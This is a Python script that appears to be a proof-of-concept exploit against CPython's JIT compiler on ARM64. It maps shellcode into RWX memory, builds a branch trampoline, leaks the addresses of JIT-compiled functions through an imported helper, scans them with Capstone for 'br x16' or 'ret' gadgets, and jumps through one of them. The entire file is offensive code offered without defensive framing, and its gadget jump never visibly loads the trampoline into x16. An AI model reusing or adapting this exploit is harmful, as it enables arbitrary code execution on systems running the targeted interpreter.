import ctypes
import mmap
import struct
from capstone import *
from jitexecleak import leak_executor_jit

# Define shellcode path
SHELLCODE_PATH = "shellcode.bin"

# Capstone setup
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True

def load_shellcode():
    with open(SHELLCODE_PATH, "rb") as f:
        code = f.read()
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    addr = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
    if addr in (None, -1, 0xffffffffffffffff):
        raise RuntimeError("[-] mmap for shellcode failed")
    ctypes.memmove(addr, code, len(code))
    print(f"[+] Shellcode mmap @ 0x{addr:x}")
    return addr

def create_trampoline(sc_addr):
    tramp_code = (
        b"\x50\x00\x00\x58" +  # ldr x16, #8
        b"\x00\x02\x1f\xd6" +  # br x16
        struct.pack("<Q", sc_addr)  # shellcode addr
    )
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    addr = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
    if addr in (None, -1, 0xffffffffffffffff):
        raise RuntimeError("[-] mmap for trampoline failed")
    assert isinstance(tramp_code, (bytes, bytearray)), "tramp_code must be bytes"
    assert len(tramp_code) <= 0x1000, "tramp_code too large"
    ctypes.memmove(addr, tramp_code, len(tramp_code))
    print(f"[+] Trampoline mmap @ 0x{addr:x} -> 0x{sc_addr:x}")
    return addr

def make_func(src):
    loc = {}
    exec(src, {}, loc)
    return loc[list(loc.keys())[0]]

# Automatically parsed stencil functions (reduced and selected set)
STENCIL_FUNCTIONS = {
    "add_int": "def hot(x): return x + 123",
    "sub_int": "def hot(x): return x - 123",
    "xor_int": "def hot(x): return x ^ 0xdeadbeef",
    "and_int": "def hot(x): return x & 0xffff0000",
    "or_int":  "def hot(x): return x | 0x5555",
    "not_int": "def hot(x): return ~x",
    "eq_cmp": "def hot(x): return x == 42",
    "len_call": "def hot(x): return len([1,2,3])",
    "neg_int": "def hot(x): return -x",
    "ret_func": "def hot(): return 1",
}

def is_gadget(insn):
    return (insn.mnemonic == "br" and insn.op_str == "x16") or insn.mnemonic == "ret"

def scan_hot_func(python_code):
    func = make_func(python_code)
    try:
        for i in range(10000):
            if func.__code__.co_argcount == 0:
                func()
            else:
                func(i)
        print("[*] Execution done, trying to leak JIT address...")
        addr = leak_executor_jit(func)
        print(f"[+] JIT address leaked: 0x{addr:x}")
        code = ctypes.string_at(addr, 0x800)
        for insn in md.disasm(code, addr):
            if is_gadget(insn):
                print(f"[GADGET] 0x{insn.address:x}: {insn.mnemonic} {insn.op_str}")
                return insn.address
    except Exception as e:
        print("[!] Leak failed:", e)
    return None

def main():
    sc = load_shellcode()
    tramp = create_trampoline(sc)

    for name, src in STENCIL_FUNCTIONS.items():
        print(f"\n=== Scanning stencil: {name} ===")
        gadget_addr = scan_hot_func(src)
        if gadget_addr:
            print(f"[*] Jumping via gadget 0x{gadget_addr:x} (x16 = trampoline)")
            FUNC = ctypes.CFUNCTYPE(None)
            fn = FUNC(gadget_addr)
            fn()
            break
    else:
        print("[-] No gadget found")

if __name__ == "__main__":
    main()
